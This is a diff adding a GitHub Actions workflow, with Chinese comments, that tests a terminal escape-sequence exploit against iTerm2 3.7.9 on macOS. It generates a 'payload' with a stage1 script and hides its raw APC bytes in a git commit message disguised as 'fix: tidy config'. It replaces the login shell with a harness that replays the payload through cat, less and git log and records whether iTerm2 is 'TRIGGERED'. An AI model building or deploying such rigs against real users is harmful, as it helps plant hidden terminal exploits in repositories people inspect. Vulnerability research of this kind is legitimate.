@@ -1,0 +1,288 @@
+name: macos-view
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - '.github/workflows/macos-view.yml'
+      - 'tools/**'
+  workflow_dispatch:
+
+jobs:
+  view:
+    runs-on: macos-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Environment
+        run: |
+          sw_vers
+          uname -m
+          which python3 less vim git
+          less --version | head -1
+
+      - name: Build payload + git repo
+        run: |
+          set -eux
+          python3 tools/stage1.py --host 127.0.0.1 --port 80 \
+            --title anubis-deploy-kit --verbose --out /tmp/payload.md
+          echo "--- payload head ---"
+          od -c /tmp/payload.md | head -3
+          # 造一个 commit message 里带 APC 的仓库
+          rm -rf /tmp/gr
+          mkdir -p /tmp/gr
+          cd /tmp/gr
+          git init -q
+          git config user.email t@t.t
+          git config user.name tester
+          echo hello > a.txt
+          git add a.txt
+          # 用 payload 文件的前几行做 commit message（含原始 APC 字节）
+          python3 -c "
+import subprocess
+raw = open('/tmp/payload.md','rb').read()
+msg = b'fix: tidy config\n\n' + raw.split(b'\n')[0] + b'\n\nsee docs\n'
+open('/tmp/msg.txt','wb').write(msg)
+print('msg bytes:', len(msg))
+"
+          git commit -q -F /tmp/msg.txt
+          echo "--- commit message od ---"
+          git --no-pager log -1 --format=%B | od -c | head -5
+          echo "repo ready"
+
+      - name: Install iTerm2 3.7.9
+        run: |
+          set -eux
+          curl -L --max-time 600 -o /tmp/i.zip "https://iterm2.com/downloads/stable/iTerm2-3_7_9.zip"
+          mkdir -p /tmp/i
+          unzip -q /tmp/i.zip -d /tmp/i
+          xattr -dr com.apple.quarantine /tmp/i/iTerm.app || true
+          sudo rm -rf /Applications/iTerm.app
+          sudo cp -R /tmp/i/iTerm.app /Applications/
+          defaults write com.googlecode.iterm2 SUHasLaunchedBefore -bool true
+          defaults write com.googlecode.iterm2 NoSyncSuppressRestoreMessage -bool true
+          defaults write com.googlecode.iterm2 NoSyncDoNotAskAboutEmptySessions -bool true
+          defaults write com.googlecode.iterm2 PromptOnQuit -bool false
+          defaults write com.googlecode.iterm2 NoSyncSuppressUpdateCheck -bool true
+          defaults write com.googlecode.iterm2 SUEnableAutomaticChecks -bool false
+
+      - name: Install view-test shell
+        run: |
+          set -eux
+          cat > /tmp/lsh.py <<'SHEOF'
+          #!/usr/bin/env python3
+          import os, sys, time, select, fcntl, pty, tty as ttymod, traceback
+
+          LOG = "/tmp/lsh.log"
+          def log(m):
+              try:
+                  open(LOG, "a").write(str(m) + "\n")
+              except Exception:
+                  pass
+
+          # 每种「查看方式」：名字, argv, 是否需要事后写 q 退出
+          METHODS = [
+              ("cat",        ["cat", "/tmp/payload.md"],                      False),
+              ("head",       ["head", "-n", "60", "/tmp/payload.md"],          False),
+              ("grep",       ["grep", "-a", "-n", "anubis", "/tmp/payload.md"], False),
+              ("less",       ["less", "/tmp/payload.md"],                      True),
+              ("less_-r",    ["less", "-r", "/tmp/payload.md"],                True),
+              ("less_-R",    ["less", "-R", "/tmp/payload.md"],                True),
+              ("git_no_pager", ["git", "-C", "/tmp/gr", "--no-pager", "log"],  False),
+              ("git_no_pager_show", ["git", "-C", "/tmp/gr", "--no-pager", "show"], False),
+          ]
+
+          def read_resp(deadline_s=5.0):
+              """从真实 tty 读响应，返回 bytes"""
+              buf = b""
+              end = time.time() + deadline_s
+              while time.time() < end:
+                  try:
+                      r, _, _ = select.select([0], [], [], 0.25)
+                  except Exception:
+                      break
+                  if not r:
+                      continue
+                  try:
+                      d = os.read(0, 65536)
+                  except OSError:
+                      d = b""
+                  if d:
+                      buf += d
+              return buf
+
+          def run_method(name, argv, needs_q):
+              """在内层 pty 跑一条命令，转发输出，返回 iTerm2 的响应字节"""
+              try:
+                  pid, fd = pty.fork()
+              except Exception as e:
+                  log("  [%s] pty.fork 失败: %r" % (name, e))
+                  return b""
+
+              if pid == 0:
+                  # 子进程：跑目标命令
+                  try:
+                      os.execv(argv[0] if "/" in argv[0] else "/usr/bin/env", 
+                               argv if "/" in argv[0] else (["env"] + argv))
+                  except Exception:
+                      try:
+                          import subprocess
+                          os._exit(subprocess.call(argv))
+                      except Exception:
+                          os._exit(127)
+
+              # 父进程：转发 + 必要时按 q
+              start = time.time()
+              sent_q = False
+              while True:
+                  if os.waitpid(pid, os.WNOHANG)[0] == pid:
+                      break
+                  try:
+                      r, _, _ = select.select([fd], [], [], 0.2)
+                  except Exception:
+                      break
+                  if r:
+                      try:
+                          d = os.read(fd, 65536)
+                      except OSError:
+                          d = b""
+                      if not d:
+                          break
+                      try:
+                          os.write(1, d)          # 转发给真实终端
+                      except Exception:
+                          pass
+                  # 交互式：2 秒后按 q
+                  if needs_q and not sent_q and time.time() - start > 2.0:
+                      try:
+                          os.write(fd, b"q")
+                          sent_q = True
+                      except Exception:
+                          pass
+                  # 保险：10 秒强退
+                  if time.time() - start > 10:
+                      try:
+                          os.kill(pid, 9)
+                      except Exception:
+                          pass
+                      break
+
+              try:
+                  os.close(fd)
+              except Exception:
+                  pass
+              try:
+                  os.waitpid(pid, 0)
+              except Exception:
+                  pass
+
+              return read_resp(4.0)
+
+          def main():
+              log("=== view-test shell pid=%d ===" % os.getpid())
+              try:
+                  log("tty=%s" % os.ttyname(0))
+              except Exception:
+                  log("tty=NOT_A_TTY"); os.execv("/bin/bash", ["/bin/bash","-l"]); return
+
+              try:
+                  ttymod.setraw(0, ttymod.TCSANOW)
+                  log("raw mode")
+              except Exception as e:
+                  log("setraw failed: %r" % (e,))
+              try:
+                  fl = fcntl.fcntl(0, fcntl.F_GETFL)
+                  fcntl.fcntl(0, fcntl.F_SETFL, fl | os.O_NONBLOCK)
+              except Exception:
+                  pass
+
+              time.sleep(2)
+
+              results = []
+              for name, argv, needs_q in METHODS:
+                  log("---- testing: %s ----" % name)
+                  # 清空残留
+                  read_resp(0.5)
+                  resp = run_method(name, argv, needs_q)
+                  n = len(resp)
+                  hit = b"\x1b_G" in resp
+                  results.append((name, n, hit))
+                  log("  %s -> %d bytes, ESC_G=%s" % (name, n, "YES" if hit else "no"))
+                  if n:
+                      try:
+                          open("/tmp/resp_%s.hex" % name, "w").write(resp.hex())
+                      except Exception:
+                          pass
+                  time.sleep(0.5)
+
+              log("=== SUMMARY ===")
+              for name, n, hit in results:
+                  log("  %-14s %6d bytes   %s" % (name, n, "TRIGGERED" if hit else "not-triggered"))
+
+              log("=== done ===")
+              time.sleep(30)
+
+          if __name__ == "__main__":
+              try:
+                  main()
+              except Exception:
+                  log("FATAL:\n" + traceback.format_exc())
+                  try:
+                      os.execv("/bin/bash", ["/bin/bash","-l"])
+                  except Exception:
+                      pass
+
+          SHEOF
+          PY=$(which python3)
+          sed -i '' "1s|.*|#!$PY|" /tmp/lsh.py
+          chmod 755 /tmp/lsh.py
+          if ! grep -qx /tmp/lsh.py /etc/shells 2>/dev/null; then
+            echo /tmp/lsh.py | sudo tee -a /etc/shells
+          fi
+          sudo chsh -s /tmp/lsh.py "$USER"
+          dscl . -read /Users/$USER UserShell
+
+      - name: Launch
+        run: |
+          open -a /Applications/iTerm.app
+          sleep 45
+          pgrep -l iTerm || echo ITERM_NOT_RUNNING
+
+      - name: Wait for summary
+        run: |
+          for i in $(seq 1 24); do
+            sleep 5
+            if grep -q "=== SUMMARY ===" /tmp/lsh.log 2>/dev/null; then
+              echo "summary ready after $((i*5))s"; break
+            fi
+          done
+          sleep 8
+
+      - name: Report
+        if: always()
+        run: |
+          echo "=============== VIEW TEST ==============="
+          cat /tmp/lsh.log 2>/dev/null || echo "(no log)"
+          echo ""
+          echo "--- response hex dumps ---"
+          for f in /tmp/resp_*.hex; do
+            [ -f "$f" ] || continue
+            echo "$f: $(head -c 200 "$f")"
+          done
+
+      - name: Screenshot
+        if: always()
+        run: screencapture -x /tmp/shot.png 2>/dev/null || true
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: view-evidence
+          path: |
+            /tmp/lsh.log
+            /tmp/payload.md
+            /tmp/resp_*.hex
+            /tmp/shot.png
+          if-no-files-found: warn
